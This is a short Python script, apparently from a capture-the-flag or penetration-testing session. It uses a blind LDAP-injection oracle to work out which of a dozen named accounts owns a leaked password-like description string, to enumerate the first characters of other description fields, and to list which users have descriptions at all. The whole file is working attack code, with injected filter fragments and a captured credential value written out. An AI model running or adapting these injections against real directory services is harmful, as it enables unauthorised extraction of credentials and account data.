#!/usr/bin/env python3
import pool_extract as P

P.init_pool()
DESC = "change*th1s_p@ssw()rd!!"
users = ["auditor", "will.s", "mark.s", "ashley.b", "heather.s", "stephen.m",
         "patrick.s", "jennifer.a", "zeke.s", "tish.c", "admin", "administrator"]

print("=== who owns the description? ===", flush=True)
for u in users:
    r = P.oracle(f"{u})(description={P.esc(DESC)}*")
    if r:
        print(f"  OWNER: {u}", flush=True)
    else:
        print(f"  -     {u}", flush=True)

print("\n=== does ANY other description exist (different first char)? ===", flush=True)
hits = []
for code in list(range(0x21, 0x7F)) + [0x20]:
    c = chr(code)
    if c in "*()\\":
        continue
    if P.oracle(f"*)(description={c}*"):
        hits.append(c)
print(f"  description initials: {hits}", flush=True)

print("\n=== users with ANY description ===", flush=True)
for u in users:
    print(f"  {u:14s} {'HAS desc' if P.oracle(u + ')(description=*') else '-'}", flush=True)

print(f"requests: {P.REQ[0]}", flush=True)
